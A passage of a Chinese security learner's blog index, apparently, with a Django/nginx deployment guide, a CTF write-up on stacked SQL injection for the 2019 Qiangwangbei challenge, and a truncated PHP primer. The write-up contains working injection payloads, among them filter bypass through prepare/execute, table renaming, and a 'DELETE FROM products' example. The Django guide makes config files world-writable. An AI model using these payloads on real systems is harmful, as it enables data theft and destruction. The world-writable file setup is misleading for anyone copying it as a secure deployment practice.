           });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UBUNTU搭Django</title>
      <link href="/2019/10/09/ubuntu-da-django/"/>
      <url>/2019/10/09/ubuntu-da-django/</url>
      
        <content type="html"><![CDATA[<h1 id="云服务器Ubuntu系统上搭Django"><a href="#云服务器Ubuntu系统上搭Django" class="headerlink" title="云服务器Ubuntu系统上搭Django"></a>云服务器Ubuntu系统上搭Django</h1><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近被大佬要求学了一波Django的框架，需要好好的了解一波</p><p>于是就有了这一篇基于腾讯云的一次实验–安装Django框架~</p><h2 id="0x01-安装Django"><a href="#0x01-安装Django" class="headerlink" title="0x01 安装Django"></a>0x01 安装Django</h2><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><pre><code>sudo apt install python-pip -y</code></pre><h3 id="使用-pip-安装-django"><a href="#使用-pip-安装-django" class="headerlink" title="使用 pip 安装 django"></a>使用 pip 安装 django</h3><pre><code>sudo pip install django==1.11</code></pre><h2 id="0x02-创建-Hello-World-应用并启动-Web-服务器"><a href="#0x02-创建-Hello-World-应用并启动-Web-服务器" class="headerlink" title="0x02 创建 Hello World 应用并启动 Web 服务器"></a>0x02 创建 Hello World 应用并启动 Web 服务器</h2><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre><code>cd /datasudo django-admin startproject helloworld</code></pre><p>定位到 /data/helloworld 目录</p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改 /data/helloworld/helloworld/settings.py 文件权限为其它人可写</p><pre><code>sudo chmod 666 /data/helloworld/helloworld/settings.py</code></pre><p>编辑 /data/helloworld/helloworld/settings.py</p><p>例如：</p><p>将 <code>ALLOWED_HOSTS = []</code> 修改为 <code>ALLOWED_HOSTS = ["119.29.186.181"]</code> ，这样可以允许通过 ip 访问</p><p>在实际运营中一般要改为对应的域名</p><h3 id="启动-django-自带的-Web-服务器"><a href="#启动-django-自带的-Web-服务器" class="headerlink" title="启动 django 自带的 Web 服务器"></a>启动 django 自带的 Web 服务器</h3><pre><code>cd helloworldsudo python manage.py runserver 0.0.0.0:8080</code></pre><p>使用浏览器访问</p><pre><code>http://119.29.186.181:8080/</code></pre><p>看到如下页面，表示 django 服务已经部署成功</p><p><img src="1.png"></p><h2 id="0x03-创建简单的页面"><a href="#0x03-创建简单的页面" class="headerlink" title="0x03 创建简单的页面"></a>0x03 创建简单的页面</h2><h3 id="关闭-Web-服务器"><a href="#关闭-Web-服务器" class="headerlink" title="关闭 Web 服务器"></a>关闭 Web 服务器</h3><p>按 <code>Ctrl + C</code> 关闭 Web 服务器</p><h3 id="创建-views-py"><a href="#创建-views-py" class="headerlink" title="创建 views.py"></a>创建 views.py</h3><p>创建文件 /data/helloworld/helloworld/views.py ，并修改权限为其它人可写</p><pre><code>sudo touch /data/helloworld/helloworld/views.pysudo chmod 666 /data/helloworld/helloworld/views.py</code></pre><h3 id="添加视图函数"><a href="#添加视图函数" class="headerlink" title="添加视图函数"></a>添加视图函数</h3><p>编辑 /data/helloworld/helloworld/views.py</p><p>添加如下内容：</p><pre><code># -*- coding: utf-8 -*-from django.http.response import HttpResponsedef hello(request):    user = request.GET.get('user')    if not user: user = 'world'    return HttpResponse('hello %s' % user)</code></pre><p>按 <code>Ctrl + S</code> 保存</p><h3 id="修改-urls-py-文件权限"><a href="#修改-urls-py-文件权限" class="headerlink" title="修改 urls.py 文件权限"></a>修改 urls.py 文件权限</h3><p>创建文件 /data/helloworld/helloworld/views.py ，并修改权限为其它人可写</p><pre><code>sudo touch /data/helloworld/helloworld/views.pysudo chmod 666 /data/helloworld/helloworld/views.py</code></pre><h3 id="添加视图函数-1"><a href="#添加视图函数-1" class="headerlink" title="添加视图函数"></a>添加视图函数</h3><p>编辑 /data/helloworld/helloworld/views.py</p><p>添加如下内容：</p><pre><code># -*- coding: utf-8 -*-from django.http.response import HttpResponsedef hello(request):    user = request.GET.get('user')    if not user: user = 'world'    return HttpResponse('hello %s' % user)</code></pre><p>按 <code>Ctrl + S</code> 保存</p><h3 id="修改-urls-py-文件权限-1"><a href="#修改-urls-py-文件权限-1" class="headerlink" title="修改 urls.py 文件权限"></a>修改 urls.py 文件权限</h3><p>修改 /data/helloworld/helloworld/urls.py 文件权限为其它人可写</p><pre><code>sudo chmod 666 /data/helloworld/helloworld/urls.py</code></pre><h3 id="添加路由配置"><a href="#添加路由配置" class="headerlink" title="添加路由配置"></a>添加路由配置</h3><p>编辑 /data/helloworld/helloworld/urls.py</p><p>将</p><pre><code>urlpatterns = [    url(r'^admin/', admin.site.urls),]</code></pre><p>修改为</p><pre><code>import viewsurlpatterns = [    url(r'^admin/', admin.site.urls),    url(r'^hello', views.hello),]</code></pre><p>按 <code>Ctrl + S</code> 保存</p><h3 id="测试-url-访问是否正常"><a href="#测试-url-访问是否正常" class="headerlink" title="测试 url 访问是否正常"></a>测试 url 访问是否正常</h3><p>再次启动 Web 服务器</p><pre><code>sudo python manage.py runserver 0.0.0.0:8080</code></pre><p>使用浏览器访问下面两个 url</p><pre><code>http://129.204.189.254:8080/hellohttp://129.204.189.254:8080/hello?user=test</code></pre><h3 id="关闭-Web-服务器-1"><a href="#关闭-Web-服务器-1" class="headerlink" title="关闭 Web 服务器"></a>关闭 Web 服务器</h3><p>按 <code>Ctrl + C</code> 停止 Web 服务器</p><h2 id="部署-uwsgi-和-nginx"><a href="#部署-uwsgi-和-nginx" class="headerlink" title="部署 uwsgi 和 nginx"></a>部署 uwsgi 和 nginx</h2><h3 id="使用-pip-安装-uwsgi"><a href="#使用-pip-安装-uwsgi" class="headerlink" title="使用 pip 安装 uwsgi"></a>使用 pip 安装 uwsgi</h3><pre><code>sudo pip install uwsgi</code></pre><h3 id="配置-uwsgi"><a href="#配置-uwsgi" class="headerlink" title="配置 uwsgi"></a>配置 uwsgi</h3><p>创建文件 /data/helloworld/uwsgi.ini ，并修改权限为其它人可写</p><pre><code>sudo touch /data/helloworld/uwsgi.inisudo chmod 666 /data/helloworld/uwsgi.ini</code></pre><p>编辑 /data/helloworld/uwsgi.ini</p><p>输入以下内容，并保存</p><pre><code>[uwsgi]chdir = /data/helloworldmodule = helloworld.wsgisocket = 127.0.0.1:8080master = truevhost = trueno-site = trueworkers = 2reload-mercy = 10     vacuum = truemax-requests = 1000   limit-as = 512buffer-size = 30000pidfile = /tmp/uwsgi.piddaemonize = /tmp/uwsgi.log</code></pre><h3 id="启动-uwsgi"><a href="#启动-uwsgi" class="headerlink" title="启动 uwsgi"></a>启动 uwsgi</h3><pre><code>export PYTHONPATH=/usr/local/lib/python2.7/dist-packagesuwsgi --ini /data/helloworld/uwsgi.ini</code></pre><h3 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h3><pre><code>sudo apt-get install nginx -y</code></pre><h3 id="添加-nginx-配置文件"><a href="#添加-nginx-配置文件" class="headerlink" title="添加 nginx 配置文件"></a>添加 nginx 配置文件</h3><p>创建文件 /etc/nginx/sites-enabled/helloworld.conf ，并修改权限为其它人可写</p><pre><code>sudo touch /etc/nginx/sites-enabled/helloworld.confsudo chmod 666 /etc/nginx/sites-enabled/helloworld.conf</code></pre><p>编辑 /etc/nginx/sites-enabled/helloworld.conf</p><p>输入以下内容，并保存</p><pre><code>server &amp;#123;    listen       80;    server_name  129.204.189.254;charset utf-8;location / &amp;#123;    uwsgi_pass 127.0.0.1:8080;    include /etc/nginx/uwsgi_params;    client_max_body_size      10m;&amp;#125;client_body_timeout  3m;send_timeout   3m;proxy_send_timeout 3m;proxy_read_timeout 3m;&amp;#125;</code></pre><h3 id="重启-nginx-服务"><a href="#重启-nginx-服务" class="headerlink" title="重启 nginx 服务"></a>重启 nginx 服务</h3><pre><code>sudo systemctl restart nginx</code></pre><h2 id="0x05测试-nginx-uwsgi-django-是否工作正常"><a href="#0x05测试-nginx-uwsgi-django-是否工作正常" class="headerlink" title="0x05测试 nginx + uwsgi + django 是否工作正常"></a>0x05测试 nginx + uwsgi + django 是否工作正常</h2><h3 id="测试页面是否能够正常访问"><a href="#测试页面是否能够正常访问" class="headerlink" title="测试页面是否能够正常访问"></a>测试页面是否能够正常访问</h3><p>使用浏览器测试下面的 url 是否可以正常访问</p><pre><code>http://129.204.189.254/hello</code></pre><p>若能则大功告成~</p><p>本次实验最好是基于 Ubuntu 16.04.1 LTS 64 位操作系统。</p><p>特别鸣谢腾讯云的指导：<a href="https://cloud.tencent.com/developer/labs/lab/10286?autoReceive=1">https://cloud.tencent.com/developer/labs/lab/10286?autoReceive=1</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【write up】buuoj 之 随便注（2019强网杯复现）引入堆叠注入</title>
      <link href="/2019/09/27/write-up-buuoj-zhi-sui-bian-zhu-2019-qiang-wang-bei-fu-xian-yin-ru-dui-die-zhu-ru/"/>
      <url>/2019/09/27/write-up-buuoj-zhi-sui-bian-zhu-2019-qiang-wang-bei-fu-xian-yin-ru-dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>最近觉得自己还是要搞定强网杯的随便注这道题（太难了…数字经济上还有魔改题）</p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>知道有个东西叫 SQL的堆叠注入</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>好的，开始进入题目</p><p>首先输入</p><p><code>1；</code></p><p>//看看有啥</p><p><img src="1.PNG"></p><p>正常骚一波</p><p>输入</p><p><code>1‘</code></p><p>有报错回显</p><p><img src="2.PNG"></p><p>接着</p><p><code>1’ order by 1#</code> </p><p>//来进行尝试用order by 测试得到列数是2，为3时报错</p><p><img src="3.PNG"></p><p>然后尝试用union联合注入</p><p><code>1' union select 1,2 #</code></p><p>//回显了过滤规则</p><p><img src="4.PNG"></p><p>然后发现有很多东西都被过滤了…那该怎么办呢！</p><p>新的东西，堆叠注入！（在sql-lab的38关也有相关的习题（早就忘光了—后悔没有写完博客））</p><p>那么就一起来讲讲堆叠！原网址：<a href="http://www.sqlinjection.net/stacked-queries/">http://www.sqlinjection.net/stacked-queries/</a></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="What-is-stacked-queries"><a href="#What-is-stacked-queries" class="headerlink" title="What is stacked-queries?"></a>What is stacked-queries?</h3><p>Stacked-queries provide a lot of control to the attacker which can by using terminate the original query and adding a new one, which will be possible to modify data and call stored procedures. </p><h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h3><blockquote><p>In SQL, a semicolon (分号) indicates that the end of a statement has been reached and what follows is a new one.</p><p>This allows executing multiple statements in the same call to the database sever.</p><p>Contrary to UNION(联合查询) attacks which are imited to SELECT statements, <strong>stacked queries can be used to any SQL statement or procedure.</strong> A classic attack using this technique could look like the following.</p></blockquote><p>For example:</p><p>malicious user(or attacker) input</p><pre class=" language-mysql"><code class="language-mysql">1;DELETE FROM products</code></pre><p>The sever terminal will get the sentence is </p><pre class=" language-mysql"><code class="language-mysql">Select * from products where productid = 1;DELETE FROM products</code></pre><p>When the query is executed, a product is returned by the first statement and all <strong>products are deleted by the second</strong>.</p><h3 id="Stacked-Queries-Limitations"><a href="#Stacked-Queries-Limitations" class="headerlink" title="Stacked Queries Limitations"></a>Stacked Queries Limitations</h3><p>You should know that the query stacking doesn’t work in every situation, because it could be possible that the API and/or database don’t support this functionally. Insufficient(不足) rights could also explain why the attacker is unable to modify data or call some procedures.</p><p><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-1-0-0">Chinese translation by another author</a> </p><p><img src="5.PNG"></p><p>Maybe there will be some mistakes by the versions that we need to discuss.</p><p>However, in mysql/php’s environment that can support the stcked queries.</p><blockquote><p>Even though we mentioned earlier that stacked queries can add any SQL statement, this injection technique is frequently limited when it comes to adding SELECTs. <strong>Both statements will be executed</strong> but software code is usually designed to handle the results returned by only one query. Consequently, the injected SELECT query will often generate an error or its results will simply be ignored. For this reason it is recommended to use UNION attacks when trying to extract data.</p><p>One last thing needs to be mentionned: to inject a valid SQL segment, the attacker will need to know some basic information such as table names, column names, etc. For more information refer to the section dedicated to information gathering.</p></blockquote><h2 id="Go-back-to-the-quiz"><a href="#Go-back-to-the-quiz" class="headerlink" title="Go back to the quiz"></a>Go back to the quiz</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>First we should know the flag in which tables.</p><pre class=" language-mysql"><code class="language-mysql">?inject=1';show tables;#?inject=1';show columns from `1919810931114514`;#</code></pre><p>However we could not use SELECT .etc  to search.</p><p>Now, we can use  mysql’s preparing sentences.</p><blockquote><p>1.PREPARE stmt from ‘your sql’s sentences;<br>2.EXECUTE stmt (if your sql has  parameter(参数), USING xxx,xxx); // USING in there is connection variable（会话变量）<br>3.DEALLOCATE PREPARE stmt; </p></blockquote><p>After we find that behind using the “prepare”‘s sql sentences are a string and then Regular matching（正则匹配） have no meaning to these strings, we can using this method to create a sentence which we can use.</p><p>Use concat(“sel”,”ect”) and then use setting the variable to save the character set @a=</p><p>Now, let us have try.</p><pre class=" language-sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span>concat<span class="token punctuation">(</span><span class="token string">"sel"</span><span class="token punctuation">,</span><span class="token string">"ect flag from `1919810931114514`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>prepare hello <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> hello<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># </span></code></pre><p>Then the system feed back that </p><p><img src="6.PNG"></p><p>Thus, we failed, but we can know that we can choose another method–change the ‘a’ to ‘A’.</p><pre class=" language-mysql"><code class="language-mysql">?inject=1';SET @a=concat("sel","ect flag from`1919810931114514`");prepare hello from @a;execute hello;#</code></pre><p><img src="7.PNG"></p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>Change the table name;</p><p> Return to the two tables’ picture, </p><p><img src="8.PNG"></p><p>Then, check both of their column.</p><pre class=" language-mysql"><code class="language-mysql">?inject=1';show columns from `1919810931114514`;#</code></pre><p><img src="9.PNG"></p><pre class=" language-mysql"><code class="language-mysql">?inject=1';show columns from `words`;#</code></pre><p><img src="10.PNG"></p><p>We can guess that we search the data is in the table ‘words’.</p><p>Then we can change the table named ‘1919810931114514’ name to ‘words’.</p><p>Now we can have a try</p><ol><li>Change table ‘words’ name to table ‘123456789’</li><li>Change table ‘1919810931114514’ name to table ‘words’</li><li>Change column’s name -&gt;change ‘flag’ to ‘id’</li></ol><pre class=" language-mysql"><code class="language-mysql">?inject=1' or 1=1;rename tables `words` to `test`;rename tables `1919810931114514`to `words`;alter table `words` change `flag` `id` varchar(100);</code></pre><p>If you want to view whether it have been changed, you can add sentences like”show tables;show columns”</p><p>For example:</p><blockquote><p>?inject=1’ or 1=1;rename tables <code>words</code> to <code>test</code>;rename tables <code>1919810931114514</code>to <code>words</code>;show tables;show columns from words;alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);show tables;show columns from words;</p></blockquote><p>The end</p><p><a href="https://blog.csdn.net/weixin_43345082/article/details/99687035">Chinese</a></p><p>Helped by his blog</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>study easy PHP program</title>
      <link href="/2019/09/02/study-easy-php-program-1/"/>
      <url>/2019/09/02/study-easy-php-program-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>由于太菜了，被大佬要求好好学一波PHP，于是只能回炉一波</p><p>ps：你连PHP都不熟，还想看框架？不了解开发还想搞网安？？？</p><p>想要web学得好，PHP必须了解</p><p>尤其是后面涉及到一些源码审计的题目</p><h2 id="0X01-PHP的功能"><a href="#0X01-PHP的功能" class="headerlink" title="0X01 PHP的功能"></a>0X01 PHP的功能</h2><h4 id="1、运行在服务器端"><a href="#1、运行在服务器端" class="headerlink" title="1、运行在服务器端"></a>1、运行在服务器端</h4><p>​    可以在远程进行指挥服务器进行运（po）转（huai）   web的大部分网站的数据都是储存在服务器端的，而PHP这门语言就是专门来处理这些存储在服务器端的数据</p><h4 id="2、跨平台"><a href="#2、跨平台" class="headerlink" title="2、跨平台"></a>2、跨平台</h4><p>​        此处的平台即服务器平台，而服务器有多种平台：Linux、Windows、Unix等，都可以进行操作</p><h4 id="3、是一门脚本语言"><a href="#3、是一门脚本语言" class="headerlink" title="3、是一门脚本语言"></a>3、是一门脚本语言</h4><p>​        它可以通过写脚本来指（zhi）挥（ling）来安排服务器进行工作</p><h2 id="0X01-1-PHP代码的标识"><a href="#0X01-1-PHP代码的标识" class="headerlink" title="0X01-1 PHP代码的标识"></a>0X01-1 PHP代码的标识</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span><span class="token string">"hello world"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>PHP语言是有着一定的格式的，在”<!--?php ?-->“中写即可</p><h4 id="0x01-1-1-echo语句"><a href="#0x01-1-1-echo语句" class="headerlink" title="0x01-1.1 echo语句"></a>0x01-1.1 echo语句</h4><p>echo语句类似于c++中的cout&lt;&lt;””&lt;&lt;endl; </p><p>又或者python中的print(“ “) 等高级语言的输出流。</p><h4 id="0x01-1-2-计算表达式"><a href="#0x01-1-2-计算表达式" class="headerlink" title="0x01-1.2 计算表达式"></a>0x01-1.2 计算表达式</h4><p>PHP是一门很任（勤）性（劳）的语言，如果在echo语句中，输入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token number">12</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>则会回显为36</p><p>它会自动将输入的数字进行计算</p><h4 id="0x01-1-3-字符串"><a href="#0x01-1-3-字符串" class="headerlink" title="0x01-1.3 字符串"></a>0x01-1.3 字符串</h4><p>PHP的字符串是有“ ”，或者‘ ’来进行表示的，同时它不像python可以用‘’‘   ’‘’来进行输出换行，这点要切记</p><p>同时它的连接符是”.”，与JavaScirpt、Asp、C等不同，不是“+”</p><p>同时“；”是它的每一句的结束符，是表示此条语句已经结束了</p><p>注释符与c++一样，还是双斜杠“//”</p><h2 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02 变量"></a>0x02 变量</h2><p>由于学过一点其他的语言，知道变量对于一个开发者来说是非常重要的</p><p>那么什么是变量呢？</p><p>变量是用于存储值的，在与服务器进行交互的时候，会产生数据，那么我们就需要开辟储存空间来储存这些值，但是是可以被替换的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"pen pineapple apple pen"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在输出的时候，第二个出现的值是改变了，这个就是变量</p><p>简单的赋值符号与其他语言基本相同，都是“=‘</p><p>所有的变量都是$+一串自己编的名字</p><p>但是命名是有一定的规律的</p><blockquote><p>1、变量名必须以<strong>字母</strong>或<strong>下划线</strong> “<strong>_</strong>”开头，如”$_name”,”$name” ,”$name2”等，但是”$9name”是不对的。</p><p>2、变量名只能由字母、数字、以及“<strong>_</strong>”组成，还能包含汉字。如”$_qq”,”$qq308” ,”$my_apple”，“比如”$name我等”，但是”$name*”是不对的。</p><p>3、变量名不允许包含空格。当变量名由多个单词组成，建议使用“<strong>_</strong>”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。</p><p>特别需要注意的是，在PHP中变量名是区分大小写的，如“$M”与“$m”代表两个不同的变量。</p></blockquote><h4 id="0x02-1-变量的数据类型"><a href="#0x02-1-变量的数据类型" class="headerlink" title="0x02-1 变量的数据类型"></a>0x02-1 变量的数据类型</h4><p>在变量中，由于变量占用的空间单元不一样（占的地盘大小不一样），也分成几种数据类型，我们可以用“memory_get_usage”获取当前PHP消耗的内存。</p><p>此处我引用一个我自学的课程里面的一段代码来解释</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$m1</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$var_string</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$m2</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">123.00</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$m3</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token operator">-</span><span class="token variable">$m2</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token number">123.00</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$m4</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token operator">-</span><span class="token variable">$m2</span><span class="token operator">-</span><span class="token variable">$m3</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$var_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$m5</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token operator">-</span><span class="token variable">$m2</span><span class="token operator">-</span><span class="token variable">$m3</span><span class="token operator">-</span><span class="token variable">$m4</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>可以分别看到自己的初始化的消耗，字符串消耗，整型的消耗，浮点型的消耗，数组的消耗</p><blockquote><p><strong>注意：根据操作系统、PHP版本以及PHP的运行方式可能输出结果会不同。</strong></p></blockquote><p>  在PHP中，支持8种原始类型，其中包括四种标量类型、两种复合类型和两种特殊类型。</p><p>  PHP与其他的语言不同，不用声明数据类型，其会自动声明</p><p>例如：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"就是就是"</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token number">9494</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>从输出的结果我们可以发现，这个变量从原来的字符串自动的变成整型。</p><p>（”var_dump”函数可以将我们的变量的数据类型显示出来。）</p><h5 id="标量类型—布尔类型"><a href="#标量类型—布尔类型" class="headerlink" title="标量类型—布尔类型"></a>标量类型—布尔类型</h5><p>与其他语言一样，PHP也拥有着布尔类型，同时布尔类型也是只有两个值，一个true，一个false，不区分大小写，“TRUE”与“true”是一样的。</p><p>主要是运用在条件结构中（例：if else结构）</p><p>尝试写一下代码，做个实验进行运用</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token variable">$man</span> <span class="token operator">=</span> <span class="token string">"男"</span><span class="token punctuation">;</span>    <span class="token variable">$male</span> <span class="token operator">=</span> <span class="token variable">$man</span> <span class="token operator">==</span> <span class="token string">"男"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$male</span> <span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span> <span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$male</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取$male值真实的数据类型</span><span class="token delimiter">?></span></code></pre><h5 id="标量类型—整型"><a href="#标量类型—整型" class="headerlink" title="标量类型—整型"></a>标量类型—整型</h5><p>整型（integer）：类似于常见的整数，可用十进制、八进制、十六进制指定</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$data_int1</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//十进制数</span><span class="token keyword">echo</span> <span class="token variable">$data_int1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$data_int2</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//负数    </span><span class="token keyword">echo</span> <span class="token variable">$data_int2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$data_int3</span> <span class="token operator">=</span> <span class="token number">0123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//八进制数</span><span class="token keyword">echo</span> <span class="token variable">$data_int3</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$data_int4</span> <span class="token operator">=</span> <span class="token number">0x123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//十六进制数</span><span class="token keyword">echo</span> <span class="token variable">$data_int4</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="标量类型—浮点型"><a href="#标量类型—浮点型" class="headerlink" title="标量类型—浮点型"></a>标量类型—浮点型</h5><p>浮点型分为（浮点数、双精度或实数）–常说的小数</p><p>可以用小数点或者科学计数法表示–小写的e或者大写的e（也是早期的php的一个漏洞）。</p><p>小实验：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$num_float1</span> <span class="token operator">=</span> <span class="token number">1.234</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num_float1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$num_float2</span> <span class="token operator">=</span> <span class="token number">1.2e3</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num_float2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$num_float3</span> <span class="token operator">=</span> <span class="token number">7.0E-3</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num_float3</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="标量类型—字符串"><a href="#标量类型—字符串" class="headerlink" 